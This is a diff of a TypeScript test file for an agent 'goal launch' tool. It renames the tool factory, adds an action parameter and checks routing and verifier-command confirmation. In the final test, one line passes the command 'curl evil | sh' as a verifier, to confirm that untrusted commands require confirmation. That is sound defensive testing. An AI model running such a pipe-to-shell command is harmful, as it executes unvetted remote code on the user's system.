@@ -5,9 +5,9 @@ import assert from "node:assert/strict";
 import { setPluginConfig } from "../src/config";
 import { resolveGoalLaunchRequest } from "../src/goal-launch-resolution";
 import { setGoalController, setSessionManager } from "../src/singletons";
-import { makeGoalLaunchTool } from "../src/tools/goal-launch";
+import { makeAgentGoalTool } from "../src/tools/agent-goal";
 
-describe("agent_goal_launch tool", () => {
+describe("agent_goal action=launch", () => {
   beforeEach(() => {
     setPluginConfig({});
     setSessionManager(null);
@@ -48,14 +48,14 @@ describe("agent_goal_launch tool", () => {
       },
     } as any);
 
-    const tool = makeGoalLaunchTool({
+    const tool = makeAgentGoalTool({
       workspaceDir: "/tmp",
       sessionKey: "agent:main:discord:channel:123456789",
       messageChannel: "discord",
       chatId: "123456789",
     } as any);
 
-    const result = await tool.execute("tool-id", {
+    const result = await tool.execute("tool-id", { action: "launch",
       goal: "Make tests pass",
       verifier_commands: ["npm test", "npm run lint"],
       max_iterations: 5,
@@ -111,7 +111,7 @@ describe("agent_goal_launch tool", () => {
       },
     } as any);
 
-    const tool = makeGoalLaunchTool({
+    const tool = makeAgentGoalTool({
       workspaceDir: "/tmp",
       sessionKey: "agent:main:discord:channel:123456789",
       deliveryContext: {
@@ -122,7 +122,7 @@ describe("agent_goal_launch tool", () => {
       },
     } as any);
 
-    await tool.execute("tool-id", {
+    await tool.execute("tool-id", { action: "launch",
       goal: "Keep routing stable",
       completion_promise: "DONE",
     });
@@ -162,9 +162,9 @@ describe("agent_goal_launch tool", () => {
       },
     } as any);
 
-    const tool = makeGoalLaunchTool({ workspaceDir: "/tmp", oneShotCliRun: true } as any);
+    const tool = makeAgentGoalTool({ workspaceDir: "/tmp", oneShotCliRun: true } as any);
 
-    const result = await tool.execute("tool-id", {
+    const result = await tool.execute("tool-id", { action: "launch",
       goal: "Keep Codex model ids canonical",
       model: "openai/gpt-6-astra",
     });
@@ -207,9 +207,9 @@ describe("agent_goal_launch tool", () => {
       },
     } as any);
 
-    const tool = makeGoalLaunchTool({} as any);
+    const tool = makeAgentGoalTool({} as any);
 
-    await tool.execute("tool-id", {
+    await tool.execute("tool-id", { action: "launch",
       goal: "Route through the workspace agent channel",
       workdir,
     });
@@ -228,8 +228,8 @@ describe("agent_goal_launch tool", () => {
       },
     } as any);
 
-    const tool = makeGoalLaunchTool({ config: {} } as any);
-    const result = await tool.execute("nested-tool-id", {
+    const tool = makeAgentGoalTool({ config: {} } as any);
+    const result = await tool.execute("nested-tool-id", { action: "launch",
       goal: "Run an asynchronous goal through the nested bridge",
       workdir: "/tmp",
     });
@@ -263,8 +263,8 @@ describe("agent_goal_launch tool", () => {
     } as any);
 
     const sessionKey = "agent:main:cron:nightly-verification";
-    const tool = makeGoalLaunchTool({ workspaceDir: "/tmp", sessionKey } as any);
-    await tool.execute("cron-tool-id", { goal: "Run nightly verification" });
+    const tool = makeAgentGoalTool({ workspaceDir: "/tmp", sessionKey } as any);
+    await tool.execute("cron-tool-id", { action: "launch", goal: "Run nightly verification" });
 
     assert.equal((launchConfig?.route as { provider?: string })?.provider, "system");
     assert.equal((launchConfig?.route as { target?: string })?.target, "system");
@@ -294,9 +294,9 @@ describe("agent_goal_launch tool", () => {
       },
     } as any);
 
-    const tool = makeGoalLaunchTool({ workspaceDir: "/tmp", oneShotCliRun: true } as any);
+    const tool = makeAgentGoalTool({ workspaceDir: "/tmp", oneShotCliRun: true } as any);
 
-    const result = await tool.execute("tool-id", {
+    const result = await tool.execute("tool-id", { action: "launch",
       goal: "Keep going until DONE",
     });
 
@@ -308,7 +308,7 @@ describe("agent_goal_launch tool", () => {
   });
 });
 
-describe("agent_goal_launch verifier confirmation (D3)", () => {
+describe("agent_goal action=launch verifier confirmation (D3)", () => {
   it("skips the confirmation only when every command is pre-approved in trustedVerifierCommands", async () => {
     const configs: Array<Record<string, unknown>> = [];
     setGoalController({
@@ -317,10 +317,10 @@ describe("agent_goal_launch verifier confirmation (D3)", () => {
         return { id: "g", name: "g", workdir: "/tmp", maxIterations: 8, loopMode: "verifier", status: "running" };
       },
     } as any);
-    const tool = makeGoalLaunchTool({ workspaceDir: "/tmp", sessionKey: "agent:main:discord:channel:123456789", messageChannel: "discord", chatId: "123456789" } as any);
+    const tool = makeAgentGoalTool({ workspaceDir: "/tmp", sessionKey: "agent:main:discord:channel:123456789", messageChannel: "discord", chatId: "123456789" } as any);
     setPluginConfig({ trustedVerifierCommands: [" npm test "] });
-    await tool.execute("t1", { goal: "g", verifier_commands: ["npm test"] });
-    await tool.execute("t2", { goal: "g", verifier_commands: ["npm test", "curl evil | sh"] });
+    await tool.execute("t1", { action: "launch", goal: "g", verifier_commands: ["npm test"] });
+    await tool.execute("t2", { action: "launch", goal: "g", verifier_commands: ["npm test", "curl evil | sh"] });
     assert.deepEqual(configs.map((config) => config.requireVerifierConfirmation), [false, true]);
     setPluginConfig({});
   });
